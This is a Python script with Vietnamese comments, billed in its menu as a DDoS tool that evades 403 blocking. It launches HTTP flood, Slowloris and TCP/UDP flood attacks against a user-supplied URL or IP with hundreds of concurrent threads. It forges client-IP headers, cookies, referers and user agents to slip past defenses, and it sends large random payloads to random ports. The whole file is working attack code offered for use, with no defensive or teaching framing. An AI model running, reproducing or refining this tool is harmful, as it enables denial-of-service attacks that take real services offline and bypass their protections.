import os
import random
import socket
import threading
import time
import asyncio
import aiohttp
from collections import deque # Dùng cho danh sách User-Agent xoay vòng

DEFAULT_THREADS = 800# Tăng số luồng mặc định
DEFAULT_PACKET_SIZE = 65500
DEFAULT_CONNECTIONS = 1500 # Tăng số kết nối mặc định cho Slowloris
RETRY_DELAY = 0.005 # Giảm thời gian chờ lại khi lỗi để tăng tốc độ

# Danh sách User-Agent đa dạng hơn
USER_AGENTS = [
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.37",
    # Mobile User Agents
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 12; Mobile; rv:103.0) Gecko/103.0 Firefox/103.0",
    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
]

# Sử dụng deque để xoay vòng User-Agent hiệu quả hơn
user_agent_deque = deque(USER_AGENTS)

def get_rotating_user_agent():
    """Lấy User-Agent từ danh sách xoay vòng."""
    ua = user_agent_deque.popleft()
    user_agent_deque.append(ua) # Đưa lại vào cuối hàng đợi
    return ua

def get_fake_ip():
    """Tạo một địa chỉ IP giả ngẫu nhiên có vẻ hợp lệ hơn."""
    # Tránh các dải IP đặc biệt (0.0.0.0/8, 10.0.0.0/8, 100.64.0.0/10, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.0.0.0/24, 192.0.2.0/24, 192.88.99.0/24, 192.168.0.0/16, 198.18.0.0/15, 198.51.100.0/24, 203.0.113.0/24, 224.0.0.0/4, 240.0.0.0/4, 255.255.255.255/32)
    # Lấy IP ngẫu nhiên từ dải công cộng phổ biến
    while True:
        first_octet = random.randint(1, 223) # Tránh 0 và dải multicast
        if first_octet in [10, 127, 169, 172, 192]: # Tránh các dải IP private/reserved phổ biến
            continue
        ip = ".".join(str(random.randint(1, 255)) for _ in range(3))
        return f"{first_octet}.{ip}"

def get_fake_cookie():
    """Tạo một chuỗi cookie giả ngẫu nhiên và phức tạp hơn."""
    return f"__cfduid={os.urandom(16).hex()}; _ga={os.urandom(10).hex()}.{os.urandom(10).hex()}; sessionid={os.urandom(12).hex()}; PHPSESSID={os.urandom(8).hex()}; csrftoken={os.urandom(16).hex()}"

def get_headers():
    """Tạo một bộ tiêu đề HTTP hoàn chỉnh với IP, cookie và User-Agent giả mới cho mỗi yêu cầu."""
    ip = get_fake_ip()
    referers = [
        "https://www.google.com/",
        "https://www.youtube.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://bing.com/",
        "https://search.yahoo.com/",
        "https://duckduckgo.com/",
        "https://www.baidu.com/",
        "https://www.reddit.com/",
        "https://www.instagram.com/",
    ]
    return {
        "User-Agent": get_rotating_user_agent(), # Lấy User-Agent xoay vòng
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", # Thêm Accept
        "Accept-Language": "en-US,en;q=0.5", # Thêm Accept-Language
        "Accept-Encoding": "gzip, deflate, br", # Thêm br (Brotli)
        "Referer": random.choice(referers),
        "X-Forwarded-For": ip,
        "Client-IP": ip,
        "True-Client-IP": ip,
        "Via": f"1.1 {ip}", # Cải thiện Via header
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache", # Thêm Pragma
        "DNT": "1", # Do Not Track
        "Cookie": get_fake_cookie(),
        "Origin": "https://www.google.com",
        "Sec-Fetch-Site": random.choice(["same-origin", "cross-site", "none"]), # Đa dạng hóa
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]), # Đa dạng hóa
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": random.choice(["document", "empty", "image"]), # Đa dạng hóa
        "TE": "Trailers", # Thêm TE
        "Upgrade-Insecure-Requests": "1" # Yêu cầu nâng cấp lên HTTPS
    }

async def make_request(session, url, attack_type, sleep_time=0):
    """
    Thực hiện một yêu cầu HTTP duy nhất với các tiêu đề giả mạo mới cho mỗi yêu cầu.
    """
    current_headers = get_headers() # Tạo tiêu đề mới cho mỗi yêu cầu để thay đổi IP, UA, v.v.
    try:
        async with session.get(url, headers=current_headers, allow_redirects=True) as resp: # Cho phép chuyển hướng
            if resp.status == 403:
                print(f"[{attack_type} 403] Bị chặn! Đổi IP & Dừng 7-9s → {url}")
                await asyncio.sleep(random.uniform(10, 15))
            elif resp.status >= 400: # Xử lý các mã lỗi khác ngoài 403
                print(f"[{attack_type} {resp.status}] Lỗi! Đổi IP & Dừng ngắn → {url}")
                await asyncio.sleep(RETRY_DELAY * 5) # Dừng lâu hơn một chút
            else:
                print(f"[{attack_type}] {resp.status if attack_type == 'HTTP' else 'Giữ kết nối'} → {url} | IP giả: {current_headers['X-Forwarded-For']}")
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
    except aiohttp.ClientError as e: # Bắt lỗi cụ thể của aiohttp (kết nối, timeout, DNS)
        # print(f"[Lỗi {attack_type}] Lỗi kết nối/timeout/DNS: {e}")
        await asyncio.sleep(RETRY_DELAY * 2) # Tăng thời gian chờ khi có lỗi kết nối
    except Exception as e: # Bắt các lỗi khác
        # print(f"[Lỗi {attack_type}] Lỗi không xác định: {e}")
        await asyncio.sleep(RETRY_DELAY * 3)

async def http_flood(session, url):
    """
    Thực hiện tấn công HTTP Flood bằng cách liên tục gửi yêu cầu GET.
    Mỗi yêu cầu sẽ sử dụng IP giả mới và các tiêu đề đa dạng.
    """
    while True:
        await make_request(session, url, "HTTP")
        await asyncio.sleep(0) # Cho phép luân phiên giữa các tác vụ

async def slowloris_attack(url):
    """
    Thực hiện tấn công Slowloris bằng cách giữ các kết nối mở.
    Mỗi kết nối sẽ sử dụng IP giả mới và các tiêu đề đa dạng.
    """
    # Tạo ClientSession mới cho mỗi luồng Slowloris để quản lý kết nối độc lập
    # Timeout tổng thể lớn hơn cho Slowloris để duy trì kết nối lâu hơn
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
        while True:
            await make_request(session, url, "Slowloris", sleep_time=random.uniform(10, 20)) # Tăng ngẫu nhiên thời gian chờ
            await asyncio.sleep(0) # Cho phép luân phiên giữa các tác vụ

def tcp_udp_flood(target_ip, attack_type, packet_size):
    payload = os.urandom(packet_size)

    while True:
        port = random.randint(1, 65535) # Chọn cổng ngẫu nhiên
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if attack_type == "UDP" else socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(1.5) # Đặt timeout cho kết nối và gửi/nhận

            if attack_type == "TCP":
                sock.connect((target_ip, port))
                # Gửi một phần payload ban đầu, sau đó gửi các phần còn lại để giữ kết nối
                sock.sendall(payload[:packet_size // 4]) # Gửi 1/4 payload ban đầu
                time.sleep(0.1) # Chờ một chút
                sock.sendall(payload[packet_size // 4:]) # Gửi phần còn lại

            else: # UDP
                sock.sendto(payload, (target_ip, port))

            print(f"[{attack_type} Flood] Sent {len(payload)} bytes → {target_ip}:{port}")

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            # print(f"[Lỗi {attack_type} Flood] Lỗi kết nối/gửi: {e}")
            time.sleep(RETRY_DELAY)
        except Exception as e:
            # print(f"[Lỗi {attack_type} Flood] Lỗi không xác định: {e}")
            time.sleep(RETRY_DELAY)
        finally:
            sock.close()

def main():
    os.system("clear" if os.name == "posix" else "cls")
    print("🚀 TOOL DDoS NÉ 403 & MẠNH MẼ HƠN NHIỀU! 🚀")
    print("1️⃣ HTTP Flood (Spam request - IP giả & UA, cookie siêu linh hoạt)")
    print("2️⃣ Slowloris (Giữ kết nối - IP giả & UA, cookie siêu linh hoạt)")
    print("3️⃣ TCP/UDP Flood (Gửi gói tin - Cải thiện TCP, thêm timeout)")
    print("4️⃣ Chạy tất cả cùng lúc!")
    attack_type = input("Chọn phương thức tấn công (1/2/3/4): ")

    if attack_type == "1":
        url = input("Nhập URL website: ")
        threads = int(input(f"Nhập số luồng (mặc định {DEFAULT_THREADS}): ") or DEFAULT_THREADS)
        print(f"🚀 HTTP Flood → {url} với {threads} luồng (IP giả, UA, cookie liên tục đổi)!")
        asyncio.run(run_http_flood(url, threads))

    elif attack_type == "2":
        url = input("Nhập URL website: ")
        threads = int(input(f"Nhập số luồng (mặc định {DEFAULT_CONNECTIONS}): ") or DEFAULT_CONNECTIONS)
        print(f"🐌 Slowloris Attack → {url} với {threads} luồng (IP giả, UA, cookie liên tục đổi)!")
        asyncio.run(run_slowloris_attack_multi(url, threads))

    elif attack_type == "3":
        target_ip = input("Nhập IP mục tiêu: ")
        method = input("Chọn kiểu tấn công (TCP/UDP): ").upper()
        threads = int(input(f"Nhập số luồng (mặc định {DEFAULT_THREADS}): ") or DEFAULT_THREADS)
        packet_size = int(input("Nhập kích thước gói tin (mặc định 65500 bytes): ") or DEFAULT_PACKET_SIZE)
        print(f"🔥 {method} Flood → {target_ip} với {threads} luồng (có timeout và cải thiện TCP)!")
        for _ in range(threads):
            thread = threading.Thread(target=tcp_udp_flood, args=(target_ip, method, packet_size))
            thread.daemon = True
            thread.start()
        while True:
            time.sleep(1)

    elif attack_type == "4":
        url = input("Nhập URL website: ")
        target_ip = input("Nhập IP mục tiêu: ")
        method = input("Chọn kiểu tấn công (TCP/UDP): ").upper()
        threads = int(input(f"Nhập số luồng cho HTTP/TCP/UDP (mặc định {DEFAULT_THREADS}): ") or DEFAULT_THREADS)
        slowloris_threads = int(input(f"Nhập số luồng cho Slowloris (mặc định {DEFAULT_CONNECTIONS}): ") or DEFAULT_CONNECTIONS)
        packet_size = int(input("Nhập kích thước gói tin (mặc định {DEFAULT_PACKET_SIZE}): ") or DEFAULT_PACKET_SIZE)
        print(f"🚀 Chạy tất cả tấn công vào {url} và {target_ip}!")

        async def run_all_async_attacks():
            await asyncio.gather(
                run_http_flood(url, threads),
                run_slowloris_attack_multi(url, slowloris_threads)
            )

        async_thread = threading.Thread(target=lambda: asyncio.run(run_all_async_attacks()))
        async_thread.daemon = True
        async_thread.start()

        for _ in range(threads):
            thread = threading.Thread(target=tcp_udp_flood, args=(target_ip, method, packet_size))
            thread.daemon = True
            thread.start()

        while True:
            time.sleep(1)

    else:
        print("❌ Lựa chọn không hợp lệ!")

async def run_http_flood(url, threads):
    timeout = aiohttp.ClientTimeout(total=10)
    conn = aiohttp.TCPConnector(limit=None, ssl=False, limit_per_host=0) # limit_per_host=0 để không giới hạn kết nối đến cùng một host
    async with aiohttp.ClientSession(timeout=timeout, connector=conn) as session:
        tasks = [http_flood(session, url) for _ in range(threads)]
        await asyncio.gather(*tasks)

async def run_slowloris_attack_multi(url, threads):
    tasks = [slowloris_attack(url) for _ in range(threads)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Đã dừng công cụ.")
    except Exception as e:
        print(f"🚨 Lỗi nghiêm trọng: {e}")

